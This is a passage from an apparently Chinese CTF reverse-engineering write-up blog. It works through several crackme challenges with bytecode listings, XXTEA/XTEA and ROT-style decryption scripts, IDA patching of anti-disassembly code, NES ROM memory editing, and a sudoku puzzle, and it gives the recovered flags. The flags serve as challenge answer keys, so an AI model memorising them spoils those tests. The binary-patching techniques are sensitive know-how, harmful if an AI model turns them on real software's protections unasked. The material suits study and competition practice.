CALL_METHOD              1<br>            144 POP_TOP<br>            146 JUMP_ABSOLUTE            8<br><br> 21     &gt;&gt;  148 LOAD_CONST               6 (&#x27;0&#x27;)<br>            150 LOAD_FAST                3 (i)<br>            152 DUP_TOP<br>            154 ROT_THREE<br>            156 COMPARE_OP               1 (&lt;=)<br>            158 POP_JUMP_IF_FALSE      168<br>            160 LOAD_CONST               7 (&#x27;9&#x27;)<br>            162 COMPARE_OP               1 (&lt;=)<br>            164 POP_JUMP_IF_FALSE      216<br>            166 JUMP_FORWARD             4 (to 172)<br>        &gt;&gt;  168 POP_TOP<br>            170 JUMP_FORWARD            44 (to 216)<br><br> 22     &gt;&gt;  172 LOAD_FAST                2 (result)<br>            174 LOAD_METHOD              0 (append)<br>            176 LOAD_GLOBAL              1 (chr)<br>            178 LOAD_GLOBAL              2 (ord)<br>            180 LOAD_FAST                3 (i)<br>            182 CALL_FUNCTION            1<br>            184 LOAD_GLOBAL              2 (ord)<br>            186 LOAD_CONST               6 (&#x27;0&#x27;)<br>            188 CALL_FUNCTION            1<br>            190 BINARY_SUBTRACT<br>            192 LOAD_FAST                1 (R)<br>            194 BINARY_ADD<br>            196 LOAD_CONST               8 (10)<br>            198 BINARY_MODULO<br>            200 LOAD_GLOBAL              2 (ord)<br>            202 LOAD_CONST               6 (&#x27;0&#x27;)<br>            204 CALL_FUNCTION            1<br>            206 BINARY_ADD<br>            208 CALL_FUNCTION            1<br>            210 CALL_METHOD              1<br>            212 POP_TOP<br>            214 JUMP_ABSOLUTE            8<br><br> 24     &gt;&gt;  216 LOAD_FAST                2 (result)<br>            218 LOAD_METHOD              0 (append)<br>            220 LOAD_FAST                3 (i)<br>            222 CALL_METHOD              1<br>            224 POP_TOP<br>            226 JUMP_ABSOLUTE            8<br><br> 25     &gt;&gt;  228 LOAD_CONST               9 (&#x27;&#x27;)<br>            230 LOAD_METHOD              3 (join)<br>            232 LOAD_FAST                2 (result)<br>            234 CALL_METHOD              1<br>            236 RETURN_VALUE<br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs plain">import hashlib<br>cipher = [-1, -36, 26, -5, 14, 41, 6, -9, 60, 29, -28, 17, 21, 7, 35, 38, 26,<br>48]<br>r = 14<br>key = &#x27;SYC&#x27;<br>data = []<br>for i in range(18):<br>    data.append((cipher[i] + ord(key[i % 3])) ^ i)<br>    print(data)<br> # [82, 52, 95, 77, 99, 105, 95, 87, 119, 121, 55, 95, 100, 109, 104, 118, 99,98]<br>char_list = [chr(num) for num in data]<br>s1 = &#x27;&#x27;.join(char_list)<br>print(s1)<br># R4_Mci_Wwy7_dmhvcb<br>def re_rot13(s, R):<br>    result = []<br>    for i in s:<br>        if &#x27;A&#x27; &lt;= i &lt;= &#x27;Z&#x27;:<br>            result.append(chr((ord(i) - ord(&#x27;A&#x27;) - R) % 26 + ord(&#x27;A&#x27;)))<br>        elif &#x27;a&#x27; &lt;= i &lt;= &#x27;z&#x27;:<br>            result.append(chr((ord(i) - ord(&#x27;a&#x27;) - R) % 26 + ord(&#x27;a&#x27;)))<br>        elif &#x27;0&#x27; &lt;= i &lt;= &#x27;9&#x27;:<br>            result.append(chr((ord(i) - ord(&#x27;0&#x27;) - R) % 10 + ord(&#x27;0&#x27;)))<br>        else:<br>            result.append(i)<br>    return &#x27;&#x27;.join(result)<br>s2 = re_rot13(s1, r)<br>print(s2)<br># D0_You_Iik3_python<br>flag = hashlib.md5(s2.encode()).hexdigest()<br>print(&quot;SYC&#123;&quot; + flag + &quot;&#125;&quot;)<br>#SYC&#123;ed798fdd74e5c382b9c7fcca88500aca&#125;<br></code></pre></td></tr></table></figure><h2 id="easy-reverse（python反编译）bugkuctf"><a href="#easy-reverse（python反编译）bugkuctf" class="headerlink" title="easy_reverse（python反编译）bugkuctf"></a>easy_reverse（python反编译）bugkuctf</h2><p><img src="/./img/0y4nWCBig3HdPZMW/1740977315009-12523273-a9a2-4b1f-a210-728c167d22e7-820557.png" alt="1740977315009-12523273-a9a2-4b1f-a210-728c167d22e7.png"></p><p><img src="/./img/0y4nWCBig3HdPZMW/1740977452894-bff09cdc-aa7d-46fe-aaba-82333148cc3b-379099.png" alt="1740977452894-bff09cdc-aa7d-46fe-aaba-82333148cc3b.png"></p><p><img src="/./img/0y4nWCBig3HdPZMW/1740977526408-05b225e4-05b7-4408-91ff-473d227700b5-778504.png" alt="1740977526408-05b225e4-05b7-4408-91ff-473d227700b5.png"></p><p><img src="/./img/0y4nWCBig3HdPZMW/1740977628433-4bfccc3c-fa25-4d59-90c2-dd6483aad3d0-278275.png" alt="1740977628433-4bfccc3c-fa25-4d59-90c2-dd6483aad3d0.png"></p><p><img src="/./img/0y4nWCBig3HdPZMW/1740977665245-7d539bc9-d042-4435-8043-793a8df1e703-628755.png" alt="1740977665245-7d539bc9-d042-4435-8043-793a8df1e703.png"></p><h2 id="baby-re-强网先锋-net逆向"><a href="#baby-re-强网先锋-net逆向" class="headerlink" title="baby_re(强网先锋)net逆向"></a>baby_re(强网先锋)net逆向</h2><p><img src="/./img/0y4nWCBig3HdPZMW/1740978789540-6afedada-be0e-4aa8-b406-671f8f4d68a7-381601.png" alt="1740978789540-6afedada-be0e-4aa8-b406-671f8f4d68a7.png"></p><p><img src="/./img/0y4nWCBig3HdPZMW/1740979093577-f57100d1-c7c1-4a4f-aaf4-621565c01ded-879948.png" alt="1740979093577-f57100d1-c7c1-4a4f-aaf4-621565c01ded.png"></p><p><img src="/./img/0y4nWCBig3HdPZMW/1740979429774-a27ec7bd-00a0-4ed4-8081-30510b3fe6d1-486979.png" alt="1740979429774-a27ec7bd-00a0-4ed4-8081-30510b3fe6d1.png"></p><p>还有一种方法是修改判断次数，修改num，调试后得到flag</p><p><img src="/./img/0y4nWCBig3HdPZMW/1740979941838-de3ee6d3-1bb7-4cc6-9a7d-214fc162d4de-218231.png" alt="1740979941838-de3ee6d3-1bb7-4cc6-9a7d-214fc162d4de.png"></p><h2 id="DASCTF-2024最后一战｜寒夜破晓，冬至终章-刻板印象re"><a href="#DASCTF-2024最后一战｜寒夜破晓，冬至终章-刻板印象re" class="headerlink" title="[DASCTF 2024最后一战｜寒夜破晓，冬至终章]刻板印象re"></a><font style="color:rgb(33, 37, 41);">[DASCTF 2024最后一战｜寒夜破晓，冬至终章]刻板印象re</font></h2><p><img src="/./img/0y4nWCBig3HdPZMW/1741067788345-54d5222e-ed2d-424a-a1e0-6f292075463f-568700.png" alt="1741067788345-54d5222e-ed2d-424a-a1e0-6f292075463f.png"></p><p><img src="/./img/0y4nWCBig3HdPZMW/1741067953657-7c1a018b-6e60-4b6a-91db-ccf6b0338f1a-695244.png" alt="1741067953657-7c1a018b-6e60-4b6a-91db-ccf6b0338f1a.png"></p><p>len&#x3D;48 </p><p>猜测sub_401023为copy函数</p><p>看一下sub_40126C这个加密函数</p><p>下面是比较函数</p><p><img src="/./img/0y4nWCBig3HdPZMW/1741067987602-c7fa999a-c3bd-41bb-ade3-2416ba4391d3-881195.png" alt="1741067987602-c7fa999a-c3bd-41bb-ade3-2416ba4391d3.png"></p><p>a1就是数据串的初始地址</p><p>密文</p><p>byte_42F090&#x3D;”aughter_is_poison_to_fear”;</p><p><font style="color:rgb(77, 77, 77);">加密逻辑在sub_401740，但是401795处有修改堆栈返回值的代码，IDA误以为后面没有代码了，nop掉这部分，就可以看到完整的伪C代码。</font></p><p><font style="color:rgb(77, 77, 77);">我说怎么原来解出来是乱码</font></p><p><font style="color:rgb(77, 77, 77);">nop掉这部分</font></p><p><img src="/./img/0y4nWCBig3HdPZMW/1741069568805-cd41cea8-c021-4bb8-8de5-36e83062dcab-995700.png" alt="1741069568805-cd41cea8-c021-4bb8-8de5-36e83062dcab.png"></p><h3 id="方法1、nop掉中间部分，然后修改上面机器码跳转到下面的指令"><a href="#方法1、nop掉中间部分，然后修改上面机器码跳转到下面的指令" class="headerlink" title="方法1、nop掉中间部分，然后修改上面机器码跳转到下面的指令"></a>方法1、nop掉中间部分，然后修改上面机器码跳转到下面的指令</h3><p><img src="/./img/0y4nWCBig3HdPZMW/1741071536293-0aced7b9-5f95-453c-95e8-90065324b866-159511.png" alt="1741071536293-0aced7b9-5f95-453c-95e8-90065324b866.png"></p><p><img src="/./img/0y4nWCBig3HdPZMW/1741071593504-4f420b6d-2dba-4e05-8d75-63b0cf80697f-508644.png" alt="1741071593504-4f420b6d-2dba-4e05-8d75-63b0cf80697f.png"></p><p>发现是XXTEA</p><p><font style="color:rgb(77, 77, 77);">delta是0x11451419</font></p><p><font style="color:rgb(77, 77, 77);">密钥是{What_is_this_?}</font></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">XTEAdecrypt</span>(<span class="hljs-params">rounds, v, k</span>):<br>    v0 = v[<span class="hljs-number">0</span>]<br>    v1 = v[<span class="hljs-number">1</span>]<br>    delta = <span class="hljs-number">0x9E3779B9</span><br>    x = delta * rounds<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(rounds):<br>        v1 -= (((v0 &lt;&lt; <span class="hljs-number">4</span>) ^ (v0 &gt;&gt; <span class="hljs-number">5</span>)) + v0) ^ (x + k[(x &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>])<br>        v1 = v1 &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        x -= delta<br>        x = x &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        v0 -= (((v1 &lt;&lt; <span class="hljs-number">4</span>) ^ (v1 &gt;&gt; <span class="hljs-number">5</span>)) + v1) ^ (x + k[x &amp; <span class="hljs-number">3</span>])<br>        v0 = v0 &amp; <span class="hljs-number">0xFFFFFFFF</span><br><span class="hljs-comment">#    v[0] = v0</span><br><span class="hljs-comment">#    v[1] = v1</span><br>    <span class="hljs-keyword">return</span> [v0,v1]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xor</span>(<span class="hljs-params">a,b</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([i^j <span class="hljs-keyword">for</span> i,j <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(a,b)])<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">shift</span>(<span class="hljs-params">z, y, x, k, p, e</span>):<br>    <span class="hljs-keyword">return</span> ((((z &gt;&gt; <span class="hljs-number">5</span>) ^ (y &lt;&lt; <span class="hljs-number">2</span>)) + ((y &gt;&gt; <span class="hljs-number">3</span>) ^ (z &lt;&lt; <span class="hljs-number">4</span>))) ^ ((x ^ y) + (k[(p &amp; <span class="hljs-number">3</span>) ^ e] ^ z)))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">XXTEAdecrypt</span>(<span class="hljs-params">v, k</span>):<br>    delta = <span class="hljs-number">0x11451419</span><br>    n = <span class="hljs-built_in">len</span>(v)<br>    rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> // (n)<br>    x = (rounds * delta) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>    y = v[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(rounds):<br>        e = (x &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span><br>        <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>            z = v[p - <span class="hljs-number">1</span>]<br>            v[p] = (v[p] - shift(z, y, x, k, p, e)) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>            y = v[p]<br>        p -= <span class="hljs-number">1</span><br>        z = v[n - <span class="hljs-number">1</span>]<br>        v[<span class="hljs-number">0</span>] = (v[<span class="hljs-number">0</span>] - shift(z, y, x, k, p, e)) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        y = v[<span class="hljs-number">0</span>]<br>        x = (x - delta) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>    <span class="hljs-keyword">return</span> v<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    key=[]<br>    keys=<span class="hljs-string">b&#x27;&#123;What_is_this_?&#125;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        key.append(struct.unpack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>,keys[i*<span class="hljs-number">4</span>:i*<span class="hljs-number">4</span>+<span class="hljs-number">4</span>])[<span class="hljs-number">0</span>])<br>    enc=<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&#x27;18091C14371D162D3C05163E0203102C0E313915043A39030D132B3E06083700170B001D1C0016060717300330060A71&#x27;</span>)<br>    enc=xor(enc,<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&#x27;8f6ca63f943df5d9366651d7662fb38fc0619ecee9d7e1bf13141614c2e7c33a7f94a1e7240ea75cd377fe4f11dc6923&#x27;</span>))<br>    encrypted=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)//<span class="hljs-number">4</span>):<br>        encrypted.append(struct.unpack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>,enc[i*<span class="hljs-number">4</span>:i*<span class="hljs-number">4</span>+<span class="hljs-number">4</span>])[<span class="hljs-number">0</span>])<br>    decrypted = XXTEAdecrypt(encrypted, key)<br>    flag=<span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(decrypted)):<br>        flag+=struct.pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>,decrypted[i])<br>    key = [<span class="hljs-number">0x756F797B</span>,<span class="hljs-number">0x6E69665F</span>,<span class="hljs-number">0x74695F64</span>,<span class="hljs-number">0x7D3F215F</span>]<br>    rounds = <span class="hljs-number">32</span><br>    enc=flag<br>    enc=xor(enc,<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&#x27;DA3023E3DC398260A54468C2437ABBE450E102C28159EA1EC68B7138278394D8F48D1A2A568A4AD454DC243FB9ED7B9A&#x27;</span>))<br>    encrypted=[]<br>    flag=<span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)//<span class="hljs-number">4</span>):<br>        encrypted.append(struct.unpack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>,enc[i*<span class="hljs-number">4</span>:i*<span class="hljs-number">4</span>+<span class="hljs-number">4</span>])[<span class="hljs-number">0</span>])<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(encrypted)//<span class="hljs-number">2</span>):<br>        decrypted = XTEAdecrypt(rounds,encrypted[i*<span class="hljs-number">2</span>:i*<span class="hljs-number">2</span>+<span class="hljs-number">2</span>], key)<br>        x=struct.pack(<span class="hljs-string">&#x27;&lt;2I&#x27;</span>,decrypted[<span class="hljs-number">0</span>],decrypted[<span class="hljs-number">1</span>])<br>        flag+=x<br>    <span class="hljs-built_in">print</span>(xor(flag,<span class="hljs-string">b&#x27;Laughter_is_poison_to_fearLaughter_is_poison_to_fear&#x27;</span>))<br><span class="hljs-comment">#DASCTF&#123;You_come_to_me_better_than_all_the_good.&#125;</span><br><br></code></pre></td></tr></table></figure><p><font style="color:rgb(77, 77, 77);"></font></p><h2 id="例题xctf-chase（nes逆向）-TPCTF"><a href="#例题xctf-chase（nes逆向）-TPCTF" class="headerlink" title="例题xctf chase（nes逆向）-TPCTF"></a><font style="color:rgb(77, 77, 77);">例题xctf chase（nes逆向）-TPCTF</font></h2><p><font style="color:rgb(77, 77, 77);">mapper为0</font></p><p><img src="/./img/0y4nWCBig3HdPZMW/1741419256964-69856734-4fc1-42ab-9929-d319c6c1fe01-694946.png" alt="1741419256964-69856734-4fc1-42ab-9929-d319c6c1fe01.png"></p><p><img src="/./img/0y4nWCBig3HdPZMW/1741418395482-843dfd13-99ea-4389-9718-783a3594f4eb-045952.png" alt="1741418395482-843dfd13-99ea-4389-9718-783a3594f4eb.png"></p><p><img src="/./img/0y4nWCBig3HdPZMW/1741419165702-57bad6fd-0b9c-4cac-a85f-f4fe2a9d7f28-550982.png" alt="1741419165702-57bad6fd-0b9c-4cac-a85f-f4fe2a9d7f28.png"></p><p><font style="color:rgb(77, 77, 77);">看到机器码从8000</font></p><p><font style="color:rgb(77, 77, 77);">ida用二进制打开 以6502的形式</font></p><h3 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a><font style="color:rgb(77, 77, 77);">flag01</font></h3><p><img src="/./img/0y4nWCBig3HdPZMW/1741419767757-5cfb67c8-a43c-4092-b050-7fa0f8a78105-003604.png" alt="1741419767757-5cfb67c8-a43c-4092-b050-7fa0f8a78105.png"></p><p><font style="color:rgb(77, 77, 77);">可以直接ce开挂, </font></p><p><img src="/./img/0y4nWCBig3HdPZMW/1741420056271-4f8d75df-b34b-48b9-8325-9b2cb0e792dc-789280.png" alt="1741420056271-4f8d75df-b34b-48b9-8325-9b2cb0e792dc.png"></p><p><font style="color:rgb(77, 77, 77);">TPCTF{D0_Y0U_L1KE_</font></p><p><font style="color:rgb(77, 77, 77);">也可用FCEUX自带的cheat改动</font><img src="/./img/0y4nWCBig3HdPZMW/1741709266224-553180e2-fb39-44d6-a16b-2e2d6e5e2545-563371.png" alt="1741709266224-553180e2-fb39-44d6-a16b-2e2d6e5e2545.png"></p><h3 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a><font style="color:rgb(77, 77, 77);">flag02</font></h3><p><font style="color:rgb(77, 77, 77);">法1</font></p><p>经过不断调试发现AB对应的值和场景有关，每个场景对应值固定且范围普遍在0-60之间，那么尝试爆破，调整AB的值，改内存时发现会有随机性，相同的值不保证每次的闪烁结果相同，这里是尝试到0x15时看到flag2：</p><p><img src="/./img/0y4nWCBig3HdPZMW/1741709756176-dbd26352-cb02-462d-8549-d69b24d71089-856000.png" alt="1741709756176-dbd26352-cb02-462d-8549-d69b24d71089.png"></p><p><font style="color:rgb(77, 77, 77);">法2</font></p><p><font style="color:rgb(85, 85, 85);background-color:rgb(250, 250, 250);">第二段有点misc的感觉，猜测也是在内存里面只不过不会加载到屏幕上，由于每段flag开头都会有THE FLAG PT我们搜索这几个字符的tile 34 28 25,一共发现两个其实一个是第一段flag，tile D2就是代表字符2 D1也就是字符1</font></p><p><font style="color:rgb(85, 85, 85);background-color:rgb(250, 250, 250);">这段是flag1</font></p><p><img src="/./img/0y4nWCBig3HdPZMW/1741710181978-c9534bf4-ebe6-4cf7-8cd9-45a6069a9013-633209.png" alt="1741710181978-c9534bf4-ebe6-4cf7-8cd9-45a6069a9013.png"></p><p><img src="/./img/0y4nWCBig3HdPZMW/1741710552358-b2720dac-228b-4429-bc6f-d7ad34761324-578670.png" alt="1741710552358-b2720dac-228b-4429-bc6f-d7ad34761324.png"></p><p><font style="color:rgb(77, 77, 77);">第二段是flag2</font></p><p><img src="/./img/0y4nWCBig3HdPZMW/1741710162833-33cee26d-da76-4d11-87dc-0609309ade76-175508.png" alt="1741710162833-33cee26d-da76-4d11-87dc-0609309ade76.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs plain">import binascii<br><br>data = &quot;34282500262C21270030340ED200262F3200392F35002933000112A4000118302C2139D12ED93DD6202DD3333D00019ABDADAD6D000103B9ADAD6E000103B9ADAD6E0001030D01030001100001000F0F0F0F0F1C2C3C0F1222320F1424340F1132300F1C2C3C0F0927380F1121310F1132300F1121310F0727380F1323330F1132300F1525350F0527380F1323330F1132300F1929390F0B27380F1727370F1132300F1626360F0727380F1828380F0F29300F0F26300F0F24300F0F213000FF490008FF4A0000074B0008074C008000FF4D0108FF4E0100074F01080750018000FF4D0208FF4E0200074F02080750028000FF4D0308FF4E0300074F03080750038077F488F499F4AAF4B0E717F4E1E827F4ACEA37F4C8EC37F448EF37F49BF217F4280044280044280044280044204F10205010205110FF2C2536252C1A000027252D331A0000000F000000002C293625331A000304037A7B7C7D7C7D7E7F80819A9B867B8788898A8B8C8D7D807D909192939495967F94959C9500000000000058E5ADE40BE7FEE48D1C038E1D038D23038E240388B9FFFF8D2D0388B9FFFF8D2C038C2F0320FFFFA0FFD0E860000000000000&quot;<br><br>data = binascii.a2b_hex(data)<br><br>table = &#123;&#125;<br>str_1 = ord(&quot;A&quot;)<br>for i in range(0x21,0x3B):<br>    table[i] = chr(str_1)<br>    str_1 += 1<br>table[0x20] = &quot;@&quot;<br>table[0] = &quot; &quot;<br>table[0x3d] = &quot;_&quot;<br>str_1 = ord(&quot;0&quot;)<br>for i in range(0xD0,0xDA):<br>    table[i] = chr(str_1)<br>    str_1 += 1<br>flag = &quot;&quot;<br><br>for i in range(len(data)):<br>    for key,value in table.items():<br>        if data[i] == key:<br>            flag += value<br>print(flag)<br></code></pre></td></tr></table></figure><p><img src="/./img/0y4nWCBig3HdPZMW/1741710467489-0446e5ee-e3bc-4afd-a9bc-27269875e8eb-594282.png" alt="1741710467489-0446e5ee-e3bc-4afd-a9bc-27269875e8eb.png"></p><p><font style="color:rgb(77, 77, 77);">THE FLAG PT2 FOR YOU IS  PLAY1N9_6@M3S_       LBRDTRPLGXAQRPAQGXCSRPEUGXCSRPIYGXGWRPFVGXHXIPFPDPAP            GWWWH H H H @@@LEVEL  GEMS       LIVES       CDMLO@0      </font></p><h3 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a><font style="color:rgb(77, 77, 77);">flag03</font></h3><p><font style="color:rgb(77, 77, 77);">看ppu viewer</font></p><p><img src="/./img/0y4nWCBig3HdPZMW/1741708666856-c2b8147d-30a2-4fe3-91ba-9775a25f2426-277328.png" alt="1741708666856-c2b8147d-30a2-4fe3-91ba-9775a25f2426.png"></p><p><font style="color:rgb(77, 77, 77);">ON_Y0UR_N3S?}</font></p><p><font style="color:rgb(77, 77, 77);"></font></p><p><font style="color:rgb(77, 77, 77);">FLAG：TPCTF{D0_Y0U_L1KE_PLAY1N9_6@M3S_ ON_Y0UR_N3S?}</font></p><h2 id="A-game-MOECTF"><a href="#A-game-MOECTF" class="headerlink" title="A_game-MOECTF"></a><font style="color:rgb(77, 77, 77);">A_game-MOECTF</font></h2><p><font style="color:rgb(77, 77, 77);">看了一下是个数独题目</font></p><p><img src="/./img/0y4nWCBig3HdPZMW/1748414863970-eee04499-9ae7-495c-80cf-6379bb4c403d-260244.png" alt="1748414863970-eee04499-9ae7-495c-80cf-6379bb4c403d.png"></p><p><font style="color:rgb(77, 77, 77);">提取box，顺便整理一下</font></p><p><img src="/./img/0y4nWCBig3HdPZMW/1748415326666-9f8543c6-d1a1-4bb9-9c55-af44a9198b9d-403373.png" alt="1748415326666-9f8543c6-d1a1-4bb9-9c55-af44a9198b9d.png"></p><p><a href="https://sudokusolving.bmcx.com/">https://sudokusolving.bmcx.com/</a></p><p><img src="/./img/0y4nWCBig3HdPZMW/1748415414031-78f0bc0f-c726-4d51-8089-5c774b6c3a01-055968.png" alt="1748415414031-78f0bc0f-c726-4d51-8089-5c774b6c3a01.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">box=[<br>    <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">5</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">4</span>,   <span class="hljs-number">3</span>,   <span class="hljs-number">6</span>,   <span class="hljs-number">0</span>,<br>    <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">5</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">2</span>,   <span class="hljs-number">4</span>,<br>    <span class="hljs-number">0</span>,   <span class="hljs-number">4</span>,   <span class="hljs-number">9</span>,   <span class="hljs-number">6</span>,   <span class="hljs-number">7</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,<br>    <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">6</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">2</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">3</span>,   <span class="hljs-number">0</span>,<br>    <span class="hljs-number">9</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">7</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">8</span>,<br>    <span class="hljs-number">0</span>,   <span class="hljs-number">3</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">5</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">9</span>,   <span class="hljs-number">0</span>,<br>    <span class="hljs-number">2</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">5</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">7</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">9</span>,<br>    <span class="hljs-number">7</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">4</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">8</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,<br>    <span class="hljs-number">0</span>,   <span class="hljs-number">9</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">4</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">6</span>]<br><span 